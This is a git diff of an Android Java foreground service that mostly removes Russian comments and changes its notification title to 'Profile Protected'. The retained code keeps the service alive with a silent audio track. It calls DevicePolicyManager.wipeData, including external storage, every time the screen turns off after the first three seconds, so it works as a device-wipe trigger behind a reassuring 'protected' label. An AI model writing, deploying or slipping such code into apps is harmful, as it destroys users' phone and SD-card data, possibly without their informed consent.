@@ -18,12 +18,11 @@ public class WatcherService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // 1. Фиксируем время старта, чтобы не вайпнуться сразу
+        
         startTime = System.currentTimeMillis();
 
-        // 2. Создаем канал уведомлений (обязательно для API 29+)
         NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        if (Build.VERSION.SDK_INT >= 26 && nm != null) {
+        if (nm != null) {
             if (nm.getNotificationChannel(CH_ID) == null) {
                 NotificationChannel channel = new NotificationChannel(
                     CH_ID, "Security System", NotificationManager.IMPORTANCE_LOW);
@@ -31,21 +30,18 @@ public class WatcherService extends Service {
             }
         }
 
-        // 3. Уведомление (чтобы сервис был Foreground)
         Notification notif = new Notification.Builder(this, CH_ID)
-                .setContentTitle("System Protected")
+                .setContentTitle("Profile Protected")
                 .setSmallIcon(android.R.drawable.ic_lock_lock)
                 .setOngoing(true)
                 .build();
 
-        // 4. Запуск Foreground (с проверкой под Android 14)
         if (Build.VERSION.SDK_INT >= 34) {
             startForeground(1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK);
         } else {
             startForeground(1, notif);
         }
 
-        // 5. Генератор тишины в отдельном потоке (простой Runnable)
         if (track == null) {
             int bSize = AudioTrack.getMinBufferSize(8000, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);
             track = new AudioTrack(AudioManager.STREAM_MUSIC, 8000, 
@@ -66,14 +62,12 @@ public class WatcherService extends Service {
             }).start();
         }
 
-        // 6. Динамический ресивер с защитой от ложных срабатываний
+        
         if (receiver == null) {
             receiver = new BroadcastReceiver() {
                 @Override
                 public void onReceive(Context context, Intent intent) {
-                    // Игнорим всё, что прилетело в первые 3 секунды жизни сервиса
                     if (System.currentTimeMillis() - startTime < 3000) return;
-
                     if (intent != null && Intent.ACTION_SCREEN_OFF.equals(intent.getAction())) {
                         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                         if (dpm != null) {
@@ -81,7 +75,6 @@ public class WatcherService extends Service {
                                 // Основная попытка вайпа (вместе с SD-картой)
                                 dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
                             } catch (Exception e) {
-                                // Если не дали прав на SD, трем хотя бы основное
                                 dpm.wipeData(0);
                             }
                         }
